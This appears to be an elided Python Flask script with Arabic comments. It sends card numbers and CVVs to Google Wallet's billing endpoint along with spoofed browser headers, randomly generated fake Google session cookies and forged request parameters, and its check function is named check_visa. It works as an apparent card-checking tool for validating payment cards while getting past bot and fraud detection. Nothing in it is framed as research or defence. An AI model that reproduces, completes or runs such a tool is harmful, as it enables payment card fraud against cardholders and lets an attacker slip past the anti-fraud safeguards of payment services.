...
def generate_random_headers():
    ...
    sec_ch_ua_versions = [
        ('"Chromium";v="137", "Not/A)Brand";v="24"', '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"'),
        ('"Google Chrome";v="109", "Not:A-Brand";v="99"', '"Google Chrome";v="109.0.5414.0", "Not:A-Brand";v="99.0.0.0"')
    ]
    
    ch_ua, ch_ua_list = random.choice(sec_ch_ua_versions)
    ...
    return {
        ...
        'sec-ch-ua-arch': '""',
        'sec-ch-ua-bitness': '""',
        'sec-ch-ua-full-version': ch_ua.split('"')[-4],
        'sec-ch-ua-full-version-list': ch_ua_list,
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': f'"SM-A{random.randint(100,500)}FN"',
...
def generate_random_cookies():
    """إنشاء كوكيز عشوائية حديثة"""
    now = datetime.now()
    timestamp = int(time.mktime(now.timetuple()))
    
    return {
        'OTZ': f'{random.randint(8000000, 9000000)}_{random.randint(40,50)}_{random.randint(40,50)}_{random.randint(100000, 200000)}_{random.randint(40,50)}_{random.randint(300000, 400000)}',
        'AEC': f'AVh_V2iLNQRzcEXTF3vPa7OKyNp7A_CPeLY78RHTg_Y55fBBgXwzH3XI4gk',
        'SID': f'g.a000{random.randint(1000,9999)}{random.choice("abcdefghijklmnopqrstuvwxyz")}{random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")}',
        '__Secure-1PSID': f'g.a000{random.randint(1000,9999)}{random.choice("abcdefghijklmnopqrstuvwxyz")}{random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")}',
        '__Secure-3PSID': f'g.a000{random.randint(1000,9999)}{random.choice("abcdefghijklmnopqrstuvwxyz")}{random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")}',
        'HSID': ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789') for _ in range(16)),
        'SSID': ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789') for _ in range(16)),
        'APISID': ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789') for _ in range(16)),
        'SAPISID': ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789') for _ in range(16)),
        '__Secure-1PAPISID': ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789') for _ in range(16)),
        '__Secure-3PAPISID': ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789') for _ in range(16)),
        'NID': f'525={"".join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(1000))}',
        '__utma': f'207539602.{random.randint(100000000, 999999999)}.{timestamp}.{timestamp + random.randint(10000, 99999)}.{timestamp + random.randint(100000, 999999)}.{random.randint(1, 20)}',
        '__utmc': '207539602',
        '__utmz': f'207539602.{timestamp + random.randint(100000, 999999)}.{random.randint(1, 20)}.{random.randint(1, 20)}.utmcsr=wallet.google.com|utmccn=(referral)|utmcmd=referral|utmcct=/',
        '__utmt': '1',
        '__utmb': f'207539602.{random.randint(1, 50)}.{random.randint(1, 20)}.{timestamp + random.randint(100000, 999999)}',
        'S': f'billing-ui-v3={"".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz") for _ in range(16))}:billing-ui-v3-efe={"".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz") for _ in range(16))}',
        'SIDCC': f'AKEyXzUmCjkDBoIeUzn1MjLKT0UJCxiyIoVnCqlnhdnkfInjALuOLuHegYe2lY4zB1S9Iw5A2w',
        '__Secure-1PSIDCC': f'AKEyXzWvdGUUC7WdaLjBrS6WRoV-UsV8xjQ_-Nu3Ulw5G0tJzLQFQLwJkGNBgLqV9dQ071eoS5A',
        '__Secure-3PSIDCC': f'AKEyXzX9wPLnze1ZbNSySoD9luy0pFb1-Vscsm4XIFeBYhw7yaAsAFZu8teiJfo1bkdxLRM_VPM',
    }

def generate_random_params():
    """إنشاء بارامترات عشوائية حديثة"""
    now = datetime.now()
    timestamp = int(time.mktime(now.timetuple()))
    
    return {
        'ait': 'GAIA',
        'cn': f'$p_x5knek8h43tc0',
        'eo': 'https://wallet.google.com',
        'hostOrigin': 'aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..',
        'ipi': ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(10)),
        'hl': 'ar',
        'mm': 'e',
        'origin': 'https://wallet.google.com',
        'si': str(random.randint(1000000000000000, 9999999999999999)),
        'style': ':m2',
        'cst': str(timestamp + random.randint(1000, 9999)),
        'wst': str(timestamp),
        's7e': '3.1.0.0;3.1.0.1',
        'rt': 'j',
...
def generate_random_data(card_number, cvv):
    """إنشاء بيانات عشوائية حديثة بناءً على بيانات البطاقة"""
    now = datetime.now()
    timestamp = int(time.mktime(now.timetuple()))
    
    return {
        'xsrf': f'AJWlU2MJEn7dsK0aJHaTGz-sRa98o6ki1g:{timestamp + random.randint(1000, 9999)}',
        '3.1.0.0': card_number,
        '3.1.0.1': cvv,
...
def check_visa():
    ...
    try:
        # إنشاء جلسة مع إعدادات أفضل للاتصال
        session = requests.Session()
        session.verify = False  # تعطيل التحقق من SSL (لأغراض الاختبار فقط)
        
        # توليد بيانات الطلب العشوائية الحديثة
        cookies = generate_random_cookies()
        headers = generate_random_headers()
        params = generate_random_params()
        data = generate_random_data(card_number, cvv)
        
        # تحديث الجلسة بالهيدرات العشوائية
        ...
        return jsonify({
            'error': str(e),
            'message': 'فشل في الاتصال بخادم جوجل. يرجى التحقق من اتصال الإنترنت أو المحاولة مرة أخرى.'
        }), 500
